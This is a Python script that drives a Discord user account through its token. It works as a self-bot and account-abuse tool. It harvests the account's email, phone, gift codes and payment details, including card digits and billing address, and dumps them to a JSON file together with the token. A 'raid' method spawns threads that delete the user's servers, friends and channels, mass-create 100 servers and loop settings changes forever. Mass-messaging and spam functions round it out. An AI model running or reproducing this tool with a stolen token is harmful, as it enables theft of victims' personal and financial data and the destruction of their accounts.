import threading
import colorama
import requests
import random
import time
import json


CGREEN = colorama.Fore.GREEN
CRED = colorama.Fore.RED
CEND = colorama.Fore.RESET


class DiscordApi:
    def __init__(self, token):
        self.token = token

        self.username = None
        self.id = None
        self.email = None
        self.phone = None

        self.HEADERS = {"authorization": self.token, "content-type": "application/json"}
        self._validate()

    def _validate(self) -> None:
        """This will check if the discord token works"""
        url = f"https://discord.com/api/users/@me"
        r = requests.get(url, headers=self.HEADERS)
        if r.status_code == 200:
            print(CGREEN + f"Valid token: {self.token}" + CEND)
            data = r.json()
            self.username = data['username'] + "#" + data['discriminator']
            self.id = data['id']
            self.email = data['email']
            self.phone = data['phone']
        else:
            print(CRED + f"Invalid token: {self.token}" + CEND)
            exit()

    def get_gifts(self) -> list:
        """It will get all the gifts of the account"""
        url = f"https://discord.com/api/v8/users/@me/entitlements/gifts"
        r = requests.get(url, headers=self.HEADERS)
        return r.json() if r.status_code == 200 else []

    def get_user_channels(self) -> list:
        """It will get all the dm of the account"""
        url = f"https://discordapp.com/api/users/@me/channels"
        r = requests.get(url, headers=self.HEADERS)
        return r.json() if r.status_code == 200 else []

    def get_guilds(self) -> list:
        """It will get all the servers of the account"""
        url = "https://discord.com/api/users/@me/guilds"
        r = requests.get(url, headers=self.HEADERS)
        return r.json() if r.status_code == 200 else []

    def get_friends(self) -> list:
        """It will get all the friends of the account"""
        url = "https://discord.com/api/users/@me/relationships"
        r = requests.get(url, headers=self.HEADERS)
        return r.json() if r.status_code == 200 else []

    def get_nitro(self) -> bool:
        """It will check if the account has nitro"""
        url = f"https://discord.com/api/users/{self.id}/profile"
        r = requests.get(url, headers=self.HEADERS)
        try:
            return bool(r.json()['premium_since'])
        except KeyError('premium_since'):
            return False

    def set_typing(self, channel_id: str, amount: int = 1) -> None:
        """It will set typing mode on a channel"""
        url = f"https://discord.com/api/channels/{channel_id}/typing"
        for _ in range(amount):
            r = requests.post(url, headers=self.HEADERS, json={})
            if r.status_code in [200, 201, 204]:
                print(CGREEN + f"{self.username} | Sent typing request: {r.status_code}" + CEND)
            else:
                print(CRED + f"{self.username} | Error {r.text}" + CEND)

    def set_custom_status(self, status: str) -> None:
        """It will set a new custom status"""
        url = "https://discord.com/api/users/@me/settings"
        status = {"custom_status": {"text": status}}
        r = requests.patch(url, headers=self.HEADERS, json=status)
        if r.status_code in [200, 201, 204]:
            print(CGREEN + f"{self.username} | Status changed to: {status}" + CEND)
        else:
            print(CRED + f"{self.username} | Error: {r.text}" + CEND)

    def set_bio(self, bio: str) -> None:
        """It will set a new bio"""
        url = "https://discord.com/api/v9/users/@me"
        payload = {"bio": bio}
        r = requests.patch(url, headers=self.HEADERS, json=payload)
        if r.status_code in [200, 201, 204]:
            print(CGREEN + f"{self.username} | Bio changed to: {bio}" + CEND)
        else:
            print(CRED + f"{self.username} | Error: {r.text}" + CEND)

    def change_theme(self, theme) -> None:
        """For change the theme between dark and light"""
        url = "https://discordapp.com/api/v8/users/@me/settings"
        if theme in ["dark", "light"]:
            r = requests.patch(url, headers=self.HEADERS, json={"theme": theme})
            if r.status_code in [200, 201, 204]:
                print(CGREEN + f"{self.username} | Theme changed to {theme}" + CEND)
            else:
                print(CRED + f"{self.username} | Error: {r.text}" + CEND)
        else:
            print(CRED + f"Invalid theme type, maybe you meant: 'dark' or 'light'" + CEND)

    def change_language(self, language: str) -> None:
        """For change the language"""
        languages = ["da", "de", "en-GB", "en-US", "es-EN", "fr", "hr", "it", "lt", "hu",
                     "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs",
                     "el", "bg", "ru", "uk", "hi", "th", "zh-CN", "ja", "zh-TW", "ko"]
        url = "https://discordapp.com/api/v8/users/@me/settings"
        if language in languages:
            r = requests.patch(url, headers=self.HEADERS, json={"locale": language})
            if r.status_code in [200, 201, 204]:
                print(CGREEN + f"{self.username} | Language changed to {language}" + CEND)
            else:
                print(CRED + f"{self.username} | Error: {r.text}" + CEND)
        else:
            print(CRED + f"Invalid language, maybe you meant: {languages}" + CEND)

    def send_message(self, msg: str, channel_id: str) -> None:
        """You can send a msg to whoever you want"""
        url = f"https://discord.com/api/channels/{channel_id}/messages"
        data = {"content": msg}
        r = requests.post(url, headers=self.HEADERS, json=data)
        if r.status_code == 200:
            print(CGREEN + f"{self.username} | Message sent to {channel_id}" + CEND)
        else:
            print(CRED + f"{self.username} | Error {r.status_code}: {channel_id}" + CEND)

    def send_mass_messages(self, msg: str) -> None:
        """It will send a msg to all the channels"""
        total = 0
        for channel in self.get_user_channels():
            self.send_message(msg, channel['id'])
            total += 1
            time.sleep(1)
        print(f"{self.username} | Sent {total} messages")


    def create_threads(self, channel: str, name: str, duration: int):
        """It will create a thread"""
        url = f"https://discord.com/api/channels/{channel}/threads"
        payload = {"name": name, "type": 11, "auto_archive_duration": duration}
        r = requests.post(url, headers=self.HEADERS, json=payload)
        if r.status_code in [200, 201, 204]:
            print(CGREEN + f"{self.username} | Created a thread at {channel}" + CEND)
        else:
            print(CRED + f"{self.username} | Failed to create the thread at {channel}" + CEND)



    def raid(self) -> None:
        """It will destroy the account"""
        threading.Thread(target=self.create_guilds, args=["raided", 100]).start()
        threading.Thread(target=self.delete_guilds).start()
        threading.Thread(target=self.delete_friends).start()
        threading.Thread(target=self.delete_channels).start()
        while True:
            languages = ["da", "de", "en-GB", "en-US", "es-EN", "fr", "hr", "it", "lt", "hu",
                         "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs",
                         "el", "bg", "ru", "uk", "hi", "th", "zh-CN", "ja", "zh-TW", "ko"]
            self.change_language(random.choice(languages))
            for i in range(2):
                theme = "dark" if i == 0 else "light"
                self.change_theme(theme)

    def get_payments(self) -> list:
        """Checks if the account has payments methods"""
        payment_types = ["Credit Card", "Paypal"]
        url = "https://discord.com/api/users/@me/billing/payment-sources"
        r = requests.get(url, headers=self.HEADERS)
        if r.status_code in [200, 201, 204]:
            payments = []
            for data in r.json():
                if int(data['type'] == 1):
                    payments.append({'type': payment_types[int(data['type']) - 1],
                                     'valid': not data['invalid'],
                                     'brand': data['brand'],
                                     'last 4': data['last_4'],
                                     'expires': str(data['expires_year']) + "y " + str(data['expires_month']) + 'm',
                                     'billing name': data['billing_address']['name'],
                                     'country': data['billing_address']['country'],
                                     'state': data['billing_address']['state'],
                                     'city': data['billing_address']['city'],
                                     'zip code': data['billing_address']['postal_code'],
                                     'address': data['billing_address']['line_1'], })
                else:
                    payments.append({'type': payment_types[int(data['type']) - 1],
                                     'valid': not data['invalid'],
                                     'email': data['email'], 'billing name': data['billing_address']['name'],
                                     'country': data['billing_address']['country'],
                                     'state': data['billing_address']['state'],
                                     'city': data['billing_address']['city'],
                                     'zip code': data['billing_address']['postal_code'],
                                     'address': data['billing_address']['line_1'], })
            return payments
        else:
            return []

    def get_messages(self, channel_id: str, page: int = 0) -> list:
        """It will get 25 messages from a channel"""
        offset = 25 * page
        url = f"https://discord.com/api/channels/{channel_id}/messages/search?offset={offset}"
        r = requests.get(url, headers=self.HEADERS)
        if r.status_code in [200, 201, 204]:
            return r.json()["messages"]
        else:
            return []

    def clear_messages(self, channel_id: str) -> None:
        """It will delete messages from a channel"""
        total_messages_url = f"https://discord.com/api/channels/{channel_id}/messages/search?author_id={self.id}"
        total_messages = requests.get(total_messages_url, headers=self.HEADERS).json()["total_results"]
        page = 0
        total = 0
        while total <= total_messages:
            messages = self.get_messages(channel_id, page)
            for message in messages:
                if message[0]["author"]["id"] == self.id:
                    url = f"https://discord.com/api/channels/{channel_id}/messages/{message[0]['id']}"
                    r = requests.delete(url, headers=self.HEADERS)
                    print(r.status_code, r.text)
                    if r.status_code in [200, 201, 204]:
                        print(CGREEN + f"{self.username} | Deleted message {message[0]['id']}" + CEND)
                        time.sleep(2)
                        total += 1
                    else:
                        print(r.status_code)
                        print(r.text)
            page += 1
        print(CGREEN + f"{self.username} | Deleted {total} messages in {channel_id}" + CEND)

    def delete_friends(self) -> None:
        """It will delete all the friends from the account"""
        total = 0
        for friend in self.get_friends():
            url = f"https://discord.com/api/users/@me/relationships/{friend['id']}"
            r = requests.delete(url, headers=self.HEADERS)
            if r.status_code in [200, 201, 204]:
                total += 1
        print(f"{self.username} | Deleted {total} friends")

    def delete_guilds(self) -> None:
        """It will delete all the servers from the account"""
        total = 0
        for guild in self.get_guilds():
            if guild['owner']:
                url = f"https://discord.com/api/guilds/{guild['id']}/delete"
                r = requests.post(url, headers=self.HEADERS, json={})
                if r.status_code in [200, 201, 204]:
                    total += 1
            else:
                url = f"https://discord.com/api/users/@me/guilds/{guild['id']}"
                requests.delete(url, headers=self.HEADERS, json={})
        print(f"{self.username} | Deleted {total} guilds")

    def delete_channels(self) -> None:
        """It will delete all the channels from the account"""
        total = 0
        for channel in self.get_user_channels():
            url = f"https://discord.com/api/channels/{channel['id']}"
            r = requests.delete(url, headers=self.HEADERS)
            if r.status_code in [200, 201, 204]:
                total += 1
        print(f"{self.username} | Deleted {total} channels")

    def create_guilds(self, name: str, amount: int) -> None:
        """To create all the servers you want"""
        url = "https://discord.com/api/v9/guilds"
        payload = {"name": name}
        total = 0
        for i in range(amount):
            r = requests.post(url, headers=self.HEADERS, json=payload)
            if r.status_code in [200, 201, 204]:
                total += 1
        print(f"{self.username} | created {total} servers")

    def dump_info(self, extra_info: bool = False) -> None:
        """It will create a file with all the info about the account"""
        info = {
            "token": self.token,
            "username": self.username,
            "id": self.id,
            "email": self.email,
            "phone": self.phone,
            "nitro": self.get_nitro(),
            "gifts": self.get_gifts(),
            "payments": self.get_payments()
        }

        if extra_info:
            info["friends"] = self.get_friends(),
            info["user_dm"] = self.get_user_channels(),
            info["guilds"] = self.get_guilds()

        with open(f"{self.username}.json", "w") as f:
            json.dump(info, f, indent=4)
        print(CGREEN + "Info dumped" + CEND)


user = DiscordApi(token="")

# user.dump_info(extra_info=True)
# user.set_typing(channel_id="Channel")
# user.send_message(msg=":neutral_face:", channel_id="831933264649519136")
# user.send_mass_messages(msg="Msg")
# user.set_bio(bio="New Bio")
# user.set_custom_status(status="New status")
# user.change_language(language="Lang")
# user.change_theme(theme="dark or light")
# user.create_threads(channel="Channel", name="Name", duration=1400)
# user.create_guilds(name="UwU", amount=100)
# user.clear_messages(channel_id="Channel")
# user.delete_guilds()
# user.delete_channels()
# user.delete_friends()
# user.raid()
